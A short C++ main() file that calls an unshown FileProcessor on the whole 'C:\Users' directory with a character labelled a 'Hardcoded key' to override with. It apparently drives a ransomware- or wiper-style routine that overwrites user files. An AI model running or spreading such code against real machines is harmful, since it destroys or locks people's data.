#include "FileProcessor.h"
#include <iostream>

int main() {

    // Hardcoded key
    const char charToOverrideWith = 'B';

    FileProcessor processor;
    processor.processDirectory("C:\\Users", charToOverrideWith);

    return 0;
}